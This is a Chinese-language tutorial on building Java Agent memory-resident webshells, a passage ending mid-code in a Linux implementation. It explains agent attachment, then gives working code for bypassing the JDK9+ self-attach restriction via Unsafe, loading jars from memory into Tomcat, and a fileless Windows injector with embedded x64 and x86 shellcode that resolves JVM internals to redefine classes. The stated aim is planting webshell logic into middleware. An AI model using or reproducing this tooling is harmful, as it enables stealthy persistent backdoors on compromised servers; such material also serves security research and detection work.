# Java Agent内存马

## Java Agent简介

Java Agent是一种在不影响程序正常运行的情况下，对JVM进行动态操作的技术，在JDK 1.5以后提供。  
Java Agent可以将指定外部Jar中的Agent代码插入到正在运行的Java程序中，当运行的Java程序检测到有Agent代码插入，会暂停主程序的运行，去执行Jar中特定的方法，执行完成后再恢复主程序的运行。  
Java提供了两种实现Agent的方式: premain和agentmain

## premain

premain是一种在JVM启动时通过Javaagent参数来实现的Agent，用于JVM启动前的一些初始化操作。  
实现premain需要满足3个条件:  

1. premain生成的jar包中MANIFEST.MF配置文件中需要指定Premain-Class。

    ```yaml
    Manifest-Version: 1.0
    Premain-Class: com.demo.premain.PreMain

    ```

2. Premain-Class指定的类需要实现premain()方法

   ```java
   package com.demo.premain.PreMain;

   import java.lang.instrument.Instrumentation;

   public static void premain(String agentArgs, Instrumentation inst) {
        ...
   }
   ```

3. Java程序启动时需要使用javaagent参数指定要插入的premain Jar包

    ```java
    java -javaagent:premain.jar Main
    ```

## agentmain

agentmain是一种可以在目标JVM运行时进行动态插入的Agent，需要通过VirtualMachine来将其插入到目标JVM环境中。
实现agentmain需要满足3个条件:

1. agentmain生成的jar包中MANIFEST.MF配置文件中需要指定Agent-Class。

    ```yaml
    Manifest-Version: 1.0
    Agent-Class: com.demo.agentmain.AgentMain
    Can-Retransform-Classes: true #表示允许重新定义类

    ```

2. Agent-Class指定的类需要实现agentmain()方法

   ```java
   package com.demo.agentmain.AgentMain;

   import java.lang.instrument.Instrumentation;

   public static void agentmain(String agentArgs, Instrumentation inst) {
        ...
   }
   ```

3. VirtualMachine类可以来实现获取系统信息，内存dump、线程dump、类信息统计（例如JVM加载的类）。  
通过VirtualMachine类来将agentmain的Jar包插入目标JVM，VirtualMachine类存在于JDK目录下/lib/tools.jar中。

    ```java
    import com.sun.tools.attach.AgentInitializationException;
    import com.sun.tools.attach.AgentLoadException;
    import com.sun.tools.attach.AttachNotSupportedException;
    import com.sun.tools.attach.VirtualMachine;

    public static void main(String[] args) throws AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        List<VirtualMachineDescriptor> list = VirtualMachine.list(); //获取当前系统上所有JVM信息。
        for (VirtualMachineDescriptor vmd : list) {
            System.out.println("进程ID：" + vmd.id() + "，进程名称：" + desc.displayName()); //获取jvm的进程pid和启动时的主类。
            VirtualMachine vm = VirtualMachine.attach(pid); //建立与目标JVM的连接，pid为目标JVM的进程pid
            vm.loadAgent(jarPath); //将agentmain生成的jar包注入到目标JVM中，注入成功会执行agentmain方法
            vm.detach(); //断开与目标JVM的连接
        }
    }
    ```

## Instrumentation

Instrumentation类是JVMTIAgent的一部分。Java Agent通过这个类和目标JVM进行交互。  
在Agent插入成功后，该Agent的代理程序中会得到一个Instrumentation实例，作为参数传入方法中，通过该实例，可以改变已加载Class的字节码。

### getAllLoadedClasses()

Instrumentation类的getAllLoadedClasses()方法用于获取目标JVM上所有已加载的类。

```java
Class[] getAllLoadedClasses();
```

### isModifiableClasses()

Instrumentation类的isModifiableClasses()方法用于判断目标JVM上已加载的类是否能够被修改。

```java
boolean isModifiableClass(Class<?> theClass);
```

### addTransformer()

Instrumentation类的addTransformerf()方法用于增加一个Class文件的转换器，转换器可以于改变Class二进制流的数据。  

```java
void addTransformer(ClassFileTransformer transformer,boolean canRetransform);
```

### removeTransformer()

Instrumentation类的removeTransformer()方法用于删除一个Class文件的转换器。

```java
boolean removeTransformer(ClassFileTransformer transformer);
```

### retransformClasses()

Instrumentation类的retransformClasses()方法retransformClasses()方法的作用是手动请求使用转换器去转换指定的一组已加载类。  

1. 对于没有加载的类，会使用ClassLoader.defineClass()定义它;
2. 对于已经加载的类，如果canRetransform的值为true,那么会使用ClassLoader.redefineClasses()重新定义。
3. 想要重定义类，需要代理jdk版本和被代理jdk版本一致。

```java
boolean retransformClasses(Class<?>[] classes throws UnmodifiableClassException;;
```

## ClassFileTransformer

ClassFileTransformer是一个接口，它提供了一个transform方法：

```java
byte[] transform(ClassLoader loader,String className,Class<?> classBeingRedefined,ProtectionDomain protectionDomain,byte[] classfileBuffer) {} throws IllegalClassFormatException;
```

1. loader:当前正在被加载的类的类加载器。
2. className:表示当前正在被加载的类的全限定名。
3. classBeingRedefined:仅在重新定义类时有效，表示即将被重新定义的类。
4. protectionDomain:表示当前正在被加载的类的保护域。
5. classfileBuffer:包含当前正在被加载的类的原始字节码

transform()方法返回的结果将作为转换器的内容。

## 完整代码

1. agentmain实现类

    ```java
    package com.demo.agentmain;

    import com.demo.Main.TransformerDemo;
    import java.lang.instrument.Instrumentation;
    import java.lang.instrument.UnmodifiableClassException;

    public class AgentMain {

        public static void agentmain(String args, Instrumentation inst) throws UnmodifiableClassException {
            inst.addTransformer(new TransformerDemo(),true);
            Class[] classes = inst.getAllLoadedClasses();
            for (Class cls : classes) {
                if (cls.getName().equals(TransformerDemo.className)) {
                    inst.retransformClasses(cls);
                }
            }
        }
    }
    ```

2. transform实现类

    ```java
    package com.demo.Main;

    import javassist.ClassPool;
    import javassist.CtClass;
    import javassist.CtMethod;
    import java.lang.instrument.ClassFileTransformer;
    import java.security.ProtectionDomain;

    public class TransformerDemo implements ClassFileTransformer {
        public static final String className = "org.example.Test02";
        private static final String methodName = "say";


        @Override
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
            if(className.replace("/", ".").equals(TransformerDemo.className)){
                try{
                    ClassPool classPool = ClassPool.getDefault();
                    CtClass ctClass = classPool.get(TransformerDemo.className);
                    CtMethod ctMethod = ctClass.getDeclaredMethod(TransformerDemo.methodName);
                    String source = "System.out.println(\"method changed success!\");";
                    ctMethod.setBody(source);
                    byte[] byteCode = ctClass.toBytecode();
                    ctClass.detach();
                    return byteCode;
                } catch (Exception e) {
                    return classfileBuffer;
                }
            }
            else {
                return classfileBuffer;
            }
        }
    }
    ```

3. MANIFEST.MF

    ```yaml
    Manifest-Version: 1.0
    Agent-Class: com.demo.agentmain.AgentMain
    Can-Retransform-Classes: true

    ```

4. 代理实现(注入当前进程)

    ```java
    package org.example;

    import java.lang.management.ManagementFactory;
    import java.lang.management.RuntimeMXBean;
    import com.sun.tools.attach.VirtualMachine;

    public class Test01 {

        public static void main(String[] args){
            Test02.say();
            loadAgent("agent.jar");
            Test02.say();
        }

        public static void loadAgent(String agentPath){
            try {
                String pid = getCurrentPid();
                System.out.println("pid ==> " + pid);
                VirtualMachine vm = VirtualMachine.attach(pid);
                System.out.println("attach success");
                vm.loadAgent(agentPath,null);
                System.out.println("load agent success");
                vm.detach();
                System.out.println("detach success");
            }catch (Exception e) {
            }
        }

        public static String getCurrentPid() {
            RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
            return runtimeMXBean.getName().split("@")[0];
        }
    }
    ```

    ```java
    package org.example;

    public class Test02 {
        public static void say()   {
            System.out.println("Hello World");
        }
    }
    ```

## 适配高版本JDK

从JDK9开始，VirtualMachine类被转移到JDK内置的jdk.attach模块中，同时对其他模块开放，无需再从tools.jar中加载。  
从JDK9开始不再允许向自身JVM进程注入agent，会抛出"Can not attach to current VM"异常，但是由于该限制是通过sun.tools.attach.HotSpotVirtualMachine类下的ALLOW_ATTACH_SELF字段的值进行判断的，因此可以通过反射修改该值来绕过。

```java
public static void loadAgent(String agentPath){
    try {
        String pid = getCurrentPid();
        System.out.println("pid ==> " + pid);
        VirtualMachine vm = VirtualMachine.attach(pid);
        System.out.println("attach success");
        vm.loadAgent(agentPath);
        System.out.println("load agent success");
        vm.detach();
        System.out.println("detach success");
    }catch (Exception e) {
        e.printStackTrace();
    }
}
public static String getCurrentPid() {
    RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
    return runtimeMXBean.getName().split("@")[0];
}
public static void selfAttach() throws Exception {
    Unsafe unsafe = getUnsafe();
    Class clazz =  Class.forName("sun.tools.attach.HotSpotVirtualMachine");
    Field field =  clazz.getDeclaredField("ALLOW_ATTACH_SELF");
    long offset = unsafe.staticFieldOffset(field);
    unsafe.putBoolean(clazz,offset,true);
}
public static Unsafe getUnsafe() throws  Exception{
    Field field = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
    field.setAccessible(true);
    return (Unsafe)field.get(null);
}
```

## Agent内存马的实现

agent内存马是通过agent技术去修改中间件中关键类的字节码，通过在方法中插入额外的webshell逻辑。  
agent内存马分为有文件落地和无文件落地两种方式，无文件落地方式是对有文件落地的升级。

### 有文件落地的内存马

有文件落地的内存马的植入步骤分为:

1. 编写agent.jar文件来修改目标类，添加webshell逻辑。
2. 将agent.jar放置到目标系统的磁盘上。
3. 通过selfattach向目标自身jvm进程注入agent.jar，植入webshell。

### 文件落地的缺点

1. 必须有一个agent.jar文件在目标机器的磁盘上来供目标JVM加载。
2. 在JDK9以下，因为agent注入需要依赖tools.jar，虽然tools.jar是JDK内置的，但JVM默认是不加载的，因此需要动态加载；  
   如果agent.jar中使用javassist动态修改字节码，则还需要确保目标环境存在该依赖，不存在的话也需要动态加载。  
3. 虽然有方法可以在内存中直接加载jar，但是由于jar的体积都不小，即使压缩后的字节码也非常大，如果写在代码中，那么会导致代码体积过大，当通过反序列化植入agent内存马时，会导致序列化后的字节码太大。
   >内存加载jar的方法:

   ```java
    import java.io.*;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    import java.net.*;
    import java.util.ArrayList;
    import java.util.List;
    import java.util.Map;
    import java.util.concurrent.ConcurrentHashMap;

    /**
    * 自定义URLStreamHandlerFactory，注册自定义协议，实现jar包在内存中动态注入
    */
    public class ResourceLoader {

        private static final Map<String, byte[]> map = new ConcurrentHashMap<>();
        private static final String customProtocol = "customProtocol";
        private static boolean flag = false;

        public static void initJar(String jarName, byte[] jarBytes) throws Exception {
            if (!flag) {
                registerFactory();
            }
            map.put(jarName, jarBytes);
            //将jar添加到系统类路径中
            ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
            Class clazz = systemClassLoader.getClass().getSuperclass();
            //changModule(clazz); //适配高版本JDK
            Field ucp = clazz.getDeclaredField("ucp");
            ucp.setAccessible(true);
            Object urlClassPath = ucp.get(systemClassLoader);
            Method addurl = urlClassPath.getClass().getMethod("addURL", URL.class);
            addurl.invoke(urlClassPath, new URL(customProtocol + ":" + jarName));
        }

        private static void registerFactory() {
            Object tomcatURLStreamHandlerFactory;
            try {
                //tomcat已经存在了URLStreamHandlerFactory对象，向这个对象添加自定义的URLStreamHandlerFactory即可。
                Class clazz = Class.forName("org.apache.catalina.webresources.TomcatURLStreamHandlerFactory");
                Method method = clazz.getMethod("getInstance");
                tomcatURLStreamHandlerFactory = method.invoke(null);
            } catch (Exception e) {
                tomcatURLStreamHandlerFactory = null;
            }
            try {
                if (tomcatURLStreamHandlerFactory != null) {
                    Method addUserFactory = tomcatURLStreamHandlerFactory.getClass().getMethod("addUserFactory", URLStreamHandlerFactory.class);
                    addUserFactory.invoke(tomcatURLStreamHandlerFactory, customProtocolFactory());
                    flag = true;
                } else {
                    URL.setURLStreamHandlerFactory(customProtocolFactory());
                    flag = true;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        private static URLStreamHandlerFactory customProtocolFactory() {
            return protocol -> {
                if (customProtocol.equalsIgnoreCase(protocol)) {
                    return new URLStreamHandler() {
                        @Override
                        protected URLConnection openConnection(URL url) {
                            String key = url.getPath();
                            return new URLConnection(url) {
                                public void connect() {
                                }

                                public InputStream getInputStream() {
                                    return new ByteArrayInputStream(map.get(key));
                                }
                            };
                        }
                    };
                }
                return null;
            };
        }

    //    public static Class getCurrentClass() throws ClassNotFoundException {
    //        String className = Thread.currentThread().getStackTrace()[1].getClassName();
    //        return Class.forName(className);
    //    }

    //    public static Unsafe getUnsafe() throws Exception {
    //    Field field = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
    //    field.setAccessible(true);
    //    return (Unsafe) field.get(null);
    //    }

    //    public static void changModule(Class target) throws Exception {
    //        Unsafe unsafe = getUnsafe();
    //        Module targetModule = target.getModule();
    //        long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
    //        unsafe.getAndSetObject(getCurrentClass(), addr, targetModule);
    //    }
    }
   ```

### 无文件实现

> jvm.dll -> JNI_GetCreatedJavaVMs -> JavaVM -> GetEnv -> JVMTIEnv -> JPLISAgent

1. agent本质上是构建一个InstrumentationImpl对象，然后调用它的retransformClasses方法进行已加载类字节码的修改
2. InstrumentationImpl的构造方法需要传入一个JPLISAgent结构体的指针参数
3. JPLISAgent结构体有一个mNormalEnviroment结构体指针，指向JVMTIEnv地址，redefineClasses方法就是依靠JVMTIEnv调用，
4. 还有一个mRedefineAvailable成员，用于决定是否允许redefineClasses方法修改字节码，这个在Java层可以通过反射修改mEnvironmentSupportsRetransformClassesKnown和mEnvironmentSupportsRetransformClasses为true
5. 要获取JVMTIEnv的地址，可以通过JavaVM结构体的GetEnv成员函数得到
6. JavaVM结构体的地址可以通过jvm.dll的JNI_GetCreatedJavaVMs成员函数得到
7. jvm.dll的地址可以通过kernel32.dll的LoadLibraryA函数得到
8. LoadLibraryA地址可以通过kernel32.dll的GetProcessAddress获取
9. GetProcessAddress地址可以通过遍历kernel32.dll的导出表获取
10. kerne32.dll地址可以通过遍历PEB结构体的双向链表得到

通过以上的步骤，就无需通过agent技术即可实现动态修改类字节码,但是问题来了，这个方式只能修改当前Java进程的字节码，无法注入到其他Java进程，如果希望修改其他Java进程加载类的字节码，还是得通过agent技术

#### Windows实现

```java
import sun.instrument.InstrumentationImpl;
import sun.misc.Unsafe;
import java.lang.instrument.ClassDefinition;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class NoFileAgent {

    private InstrumentationImpl inst;
    private Unsafe unsafe;
    private int bitNumber;

    public NoFileAgent() {
        this.bitNumber = Integer.parseInt(System.getProperties().getProperty("sun.arch.data.model")) == 64 ? 64 : 32;
        this.unsafe = getUnsafe();
        this.inst = getInstrumentationImpl();
    }
    public void inject(String className, byte[] classBody) throws Exception {
        if(this.inst == null){
            return;
        }
        ClassDefinition definition = new ClassDefinition(Class.forName(className), classBody);
        Method redefineClazz = InstrumentationImpl.class.getMethod("redefineClasses", ClassDefinition[].class);
        redefineClazz.invoke(this.inst, new Object[]{new ClassDefinition[]{definition}});
    }
    private InstrumentationImpl getInstrumentationImpl(){
        try {
            Class<?> instClazz = Class.forName("sun.instrument.InstrumentationImpl");
            Constructor<?> constructor = instClazz.getDeclaredConstructor(long.class, boolean.class, boolean.class);
            constructor.setAccessible(true);
            return (InstrumentationImpl)constructor.newInstance(getJPLISAgentPointer(), true, false);
        }catch (Exception e){
            return null;
        }
    }
    private long getJPLISAgentPointer() throws Exception {
        /*
            struct _JPLISEnvironment {
                jvmtiEnv *              mJVMTIEnv;              //the JVM TI environment
                JPLISAgent *            mAgent;                 //corresponding agent
                jboolean                mIsRetransformer;       //indicates if special environment
                };
            typedef struct _JPLISEnvironment  JPLISEnvironment;

            struct _JPLISAgent {
                JavaVM *                mJVM;                   // JVM指针，但RedefineClasses()没有用到，可以忽略，全填充0即可
                JPLISEnvironment        mNormalEnvironment;     // _JPLISEnvironment结构体
                ..... //无关紧要的成员
                };
            typedef struct _JPLISAgent        JPLISAgent;
            #define jvmti(a) a->mNormalEnvironment.mJVMTIEnv    //实际功能就是取_JPLISAgent.mNormalEnvironment。类型是_JPLISEnvironment
        */
        long JPLISAgent = this.unsafe.allocateMemory(0x1000); //申请内存用于存储JPLISAgent结构体
        //shellCode用于获取JVMTIEnv结构体
        if(this.bitNumber == 64){
            int pointerLength = 8;
            byte[] shellCode = new byte[]{(byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x28, (byte) 0x48, (byte) 0x83, (byte) 0xE4, (byte) 0xF0, (byte) 0x48, (byte) 0x31, (byte) 0xC9, (byte) 0x65, (byte) 0x48, (byte) 0x8B, (byte) 0x41, (byte) 0x60, (byte) 0x48, (byte) 0x8B, (byte) 0x40, (byte) 0x18, (byte) 0x48, (byte) 0x8B, (byte) 0x70, (byte) 0x20, (byte) 0x48, (byte) 0xAD, (byte) 0x48, (byte) 0x96, (byte) 0x48, (byte) 0xAD, (byte) 0x48, (byte) 0x8B, (byte) 0x58, (byte) 0x20, (byte) 0x4D, (byte) 0x31, (byte) 0xC0, (byte) 0x44, (byte) 0x8B, (byte) 0x43, (byte) 0x3C, (byte) 0x4C, (byte) 0x89, (byte) 0xC2, (byte) 0x48, (byte) 0x01, (byte) 0xDA, (byte) 0x44, (byte) 0x8B, (byte) 0x82, (byte) 0x88, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x49, (byte) 0x01, (byte) 0xD8, (byte) 0x48, (byte) 0x31, (byte) 0xF6, (byte) 0x41, (byte) 0x8B, (byte) 0x70, (byte) 0x20, (byte) 0x48, (byte) 0x01, (byte) 0xDE, (byte) 0x48, (byte) 0x31, (byte) 0xC9, (byte) 0x49, (byte) 0xB9, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x50, (byte) 0x72, (byte) 0x6F, (byte) 0x63, (byte) 0x41, (byte) 0x48, (byte) 0xFF, (byte) 0xC1, (byte) 0x48, (byte) 0x31, (byte) 0xC0, (byte) 0x8B, (byte) 0x04, (byte) 0x8E, (byte) 0x48, (byte) 0x01, (byte) 0xD8, (byte) 0x4C, (byte) 0x39, (byte) 0x08, (byte) 0x75, (byte) 0xEF, (byte) 0x48, (byte) 0x31, (byte) 0xF6, (byte) 0x41, (byte) 0x8B, (byte) 0x70, (byte) 0x24, (byte) 0x48, (byte) 0x01, (byte) 0xDE, (byte) 0x66, (byte) 0x8B, (byte) 0x0C, (byte) 0x4E, (byte) 0x48, (byte) 0x31, (byte) 0xF6, (byte) 0x41, (byte) 0x8B, (byte) 0x70, (byte) 0x1C, (byte) 0x48, (byte) 0x01, (byte) 0xDE, (byte) 0x48, (byte) 0x31, (byte) 0xD2, (byte) 0x8B, (byte) 0x14, (byte) 0x8E, (byte) 0x48, (byte) 0x01, (byte) 0xDA, (byte) 0x48, (byte) 0x89, (byte) 0xD7, (byte) 0xB9, (byte) 0x61, (byte) 0x72, (byte) 0x79, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0xB9, (byte) 0x4C, (byte) 0x6F, (byte) 0x61, (byte) 0x64, (byte) 0x4C, (byte) 0x69, (byte) 0x62, (byte) 0x72, (byte) 0x51, (byte) 0x48, (byte) 0x89, (byte) 0xE2, (byte) 0x48, (byte) 0x89, (byte) 0xD9, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x30, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x30, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x10, (byte) 0x48, (byte) 0x89, (byte) 0xC6, (byte) 0xB9, (byte) 0x6C, (byte) 0x6C, (byte) 0x00, (byte) 0x00, (byte) 0x51, (byte) 0xB9, (byte) 0x6A, (byte) 0x76, (byte) 0x6D, (byte) 0x00, (byte) 0x51, (byte) 0x48, (byte) 0x89, (byte) 0xE1, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x30, (byte) 0xFF, (byte) 0xD6, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x30, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x10, (byte) 0x49, (byte) 0x89, (byte) 0xC7, (byte) 0x48, (byte) 0x31, (byte) 0xC9, (byte) 0x48, (byte) 0xB9, (byte) 0x76, (byte) 0x61, (byte) 0x56, (byte) 0x4D, (byte) 0x73, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x51, (byte) 0x48, (byte) 0xB9, (byte) 0x72, (byte) 0x65, (byte) 0x61, (byte) 0x74, (byte) 0x65, (byte) 0x64, (byte) 0x4A, (byte) 0x61, (byte) 0x51, (byte) 0x48, (byte) 0xB9, (byte) 0x4A, (byte) 0x4E, (byte) 0x49, (byte) 0x5F, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x43, (byte) 0x51, (byte) 0x48, (byte) 0x89, (byte) 0xE2, (byte) 0x4C, (byte) 0x89, (byte) 0xF9, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x28, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x28, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x18, (byte) 0x49, (byte) 0x89, (byte) 0xC7, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x28, (byte) 0x48, (byte) 0x89, (byte) 0xE1, (byte) 0xBA, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x49, (byte) 0x89, (byte) 0xC8, (byte) 0x49, (byte) 0x83, (byte) 0xC0, (byte) 0x08, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x28, (byte) 0x41, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x28, (byte) 0x48, (byte) 0x8B, (byte) 0x09, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x20, (byte) 0x54, (byte) 0x48, (byte) 0x89, (byte) 0xE2, (byte) 0x4D, (byte) 0x31, (byte) 0xC0, (byte) 0x4C, (byte) 0x8B, (byte) 0x39, (byte) 0x4D, (byte) 0x8B, (byte) 0x7F, (byte) 0x20, (byte) 0x49, (byte) 0x89, (byte) 0xCE, (byte) 0x41, (byte) 0xFF, (byte) 0xD7, (byte) 0x4C, (byte) 0x89, (byte) 0xF1, (byte) 0x48, (byte) 0xBA, (byte) 0x48, (byte) 0x47, (byte) 0x46, (byte) 0x45, (byte) 0x44, (byte) 0x43, (byte) 0x42, (byte) 0x41, (byte) 0x41, (byte) 0xB8, (byte) 0x00, (byte) 0x02, (byte) 0x01, (byte) 0x30, (byte) 0x4D, (byte) 0x8B, (byte) 0x3E, (byte) 0x4D, (byte) 0x8B, (byte) 0x7F, (byte) 0x30, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x20, (byte) 0x41, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x20, (byte) 0x4C, (byte) 0x89, (byte) 0xF1, (byte) 0x4D, (byte) 0x8B, (byte) 0x3E, (byte) 0x4D, (byte) 0x8B, (byte) 0x7F, (byte) 0x28, (byte) 0x41, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x78, (byte) 0xC3};
            byte[] stub = longToLittleEndianBytes(JPLISAgent + pointerLength,pointerLength); //将JVMTIEnv的地址转为小端字节序列
            System.arraycopy(stub, 0, shellCode, shellCode.length - 50, stub.length); //替换shellcode中用于接收JVMTIEnv结构体的地址
            runShellCode(shellCode); //执行shellCode，获取JPLISAgent结构体
            long jvmtiEnv = this.unsafe.getLong(JPLISAgent + pointerLength); //读取JPLISAgent结构体中的jvmtiEnv结构体的地址
            this.unsafe.putByte(jvmtiEnv + 361, (byte) 2); //修正jvmtiEnv结构体can_redefine_classes成员为2，相当于开启Can-Redefine-Classes，不同JDK版本偏移量不一样
            return JPLISAgent;
        }
        else{
            int pointerLength = 4;
            byte[] shellCode = new byte[]{(byte) 0x90, (byte) 0x90, (byte) 0x90, (byte) 0x33, (byte) 0xC9, (byte) 0x64, (byte) 0xA1, (byte) 0x30, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x8B, (byte) 0x40, (byte) 0x0C, (byte) 0x8B, (byte) 0x70, (byte) 0x14, (byte) 0xAD, (byte) 0x96, (byte) 0xAD, (byte) 0x8B, (byte) 0x58, (byte) 0x10, (byte) 0x8B, (byte) 0x53, (byte) 0x3C, (byte) 0x03, (byte) 0xD3, (byte) 0x8B, (byte) 0x52, (byte) 0x78, (byte) 0x03, (byte) 0xD3, (byte) 0x33, (byte) 0xC9, (byte) 0x8B, (byte) 0x72, (byte) 0x20, (byte) 0x03, (byte) 0xF3, (byte) 0x41, (byte) 0xAD, (byte) 0x03, (byte) 0xC3, (byte) 0x81, (byte) 0x38, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x50, (byte) 0x75, (byte) 0xF4, (byte) 0x81, (byte) 0x78, (byte) 0x04, (byte) 0x72, (byte) 0x6F, (byte) 0x63, (byte) 0x41, (byte) 0x75, (byte) 0xEB, (byte) 0x81, (byte) 0x78, (byte) 0x08, (byte) 0x64, (byte) 0x64, (byte) 0x72, (byte) 0x65, (byte) 0x75, (byte) 0xE2, (byte) 0x8B, (byte) 0x72, (byte) 0x24, (byte) 0x03, (byte) 0xF3, (byte) 0x66, (byte) 0x8B, (byte) 0x0C, (byte) 0x4E, (byte) 0x49, (byte) 0x8B, (byte) 0x72, (byte) 0x1C, (byte) 0x03, (byte) 0xF3, (byte) 0x8B, (byte) 0x14, (byte) 0x8E, (byte) 0x03, (byte) 0xD3, (byte) 0x52, (byte) 0x33, (byte) 0xC9, (byte) 0x51, (byte) 0x68, (byte) 0x61, (byte) 0x72, (byte) 0x79, (byte) 0x41, (byte) 0x68, (byte) 0x4C, (byte) 0x69, (byte) 0x62, (byte) 0x72, (byte) 0x68, (byte) 0x4C, (byte) 0x6F, (byte) 0x61, (byte) 0x64, (byte) 0x54, (byte) 0x53, (byte) 0xFF, (byte) 0xD2, (byte) 0x83, (byte) 0xC4, (byte) 0x0C, (byte) 0x59, (byte) 0x50, (byte) 0x66, (byte) 0xB9, (byte) 0x33, (byte) 0x32, (byte) 0x51, (byte) 0x68, (byte) 0x6A, (byte) 0x76, (byte) 0x6D, (byte) 0x00, (byte) 0x54, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0xD8, (byte) 0x83, (byte) 0xC4, (byte) 0x0C, (byte) 0x5A, (byte) 0x33, (byte) 0xC9, (byte) 0x51, (byte) 0x6A, (byte) 0x73, (byte) 0x68, (byte) 0x76, (byte) 0x61, (byte) 0x56, (byte) 0x4D, (byte) 0x68, (byte) 0x65, (byte) 0x64, (byte) 0x4A, (byte) 0x61, (byte) 0x68, (byte) 0x72, (byte) 0x65, (byte) 0x61, (byte) 0x74, (byte) 0x68, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x43, (byte) 0x68, (byte) 0x4A, (byte) 0x4E, (byte) 0x49, (byte) 0x5F, (byte) 0x54, (byte) 0x53, (byte) 0xFF, (byte) 0xD2, (byte) 0x89, (byte) 0x45, (byte) 0xF0, (byte) 0x54, (byte) 0x6A, (byte) 0x01, (byte) 0x54, (byte) 0x59, (byte) 0x83, (byte) 0xC1, (byte) 0x10, (byte) 0x51, (byte) 0x54, (byte) 0x59, (byte) 0x6A, (byte) 0x01, (byte) 0x51, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0xC1, (byte) 0x83, (byte) 0xEC, (byte) 0x30, (byte) 0x6A, (byte) 0x00, (byte) 0x54, (byte) 0x59, (byte) 0x83, (byte) 0xC1, (byte) 0x10, (byte) 0x51, (byte) 0x8B, (byte) 0x00, (byte) 0x50, (byte) 0x8B, (byte) 0x18, (byte) 0x8B, (byte) 0x43, (byte) 0x10, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0x43, (byte) 0x18, (byte) 0x68, (byte) 0x00, (byte) 0x02, (byte) 0x01, (byte) 0x30, (byte) 0x68, (byte) 0x44, (byte) 0x43, (byte) 0x42, (byte) 0x41, (byte) 0x83, (byte) 0xEC, (byte) 0x04, (byte) 0xFF, (byte) 0xD0, (byte) 0x83, (byte) 0xEC, (byte) 0x0C, (byte) 0x8B, (byte) 0x43, (byte) 0x14, (byte) 0xFF, (byte) 0xD0, (byte) 0x83, (byte) 0xC4, (byte) 0x5C, (byte) 0xC3};
            byte[] stub = longToLittleEndianBytes(JPLISAgent + pointerLength,pointerLength);
            System.arraycopy(stub, 0, shellCode, shellCode.length - 21, stub.length);
            runShellCode(shellCode);
            long jvmtiEnv = this.unsafe.getLong(JPLISAgent + pointerLength);
            this.unsafe.putByte(jvmtiEnv + 201, (byte) 2);
            return JPLISAgent;
        }
    }

    private byte[] longToLittleEndianBytes(long value, int pointerLength) {
        byte[] bytes = new byte[pointerLength];
        for (int i = 0; i < 8; i++) {
            bytes[i] = (byte) (value >>> (i * 8));
        }
        return bytes;
    }

    private void runShellCode(byte[] shellCode) throws Exception {
        Class clazz = Class.forName("sun.tools.attach.WindowsVirtualMachine");
        Method enqueue = clazz.getDeclaredMethod("enqueue", long.class, byte[].class, String.class, String.class, Object[].class);
        enqueue.setAccessible(true);
        enqueue.invoke(null, -1, shellCode, null, null, new Object[]{});
    }

    private Unsafe getUnsafe() {
        try{
        Field field = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
        field.setAccessible(true);
        return (Unsafe) field.get(null);
        }catch(Exception e){
            return null;
        }
    }
}
```

#### Linux实现

```cpp
import sun.instrument.InstrumentationImpl;
import sun.misc.Unsafe;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.RandomAccessFile;
import java.lang.instrument.ClassDefinition;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class NoFileAgentForLinux {
    private static final int SHT_DYNSYM =  11;
    private static final int STT_FUNC =  2;
    private static final int STT_GNU_IFUNC =  10;
    private InstrumentationImpl inst;
    private Unsafe unsafe;

    public NoFileAgentForLinux() {
        this.unsafe = getUnsafe();
        this.inst = getInstrumentationImpl();
    }
    public void inject(String className, byte[] classBody) throws Exception {
        if(this.inst == null){
            return;
        }
        ClassDefinition definition = new ClassDefinition(Class.forName(className), classBody);
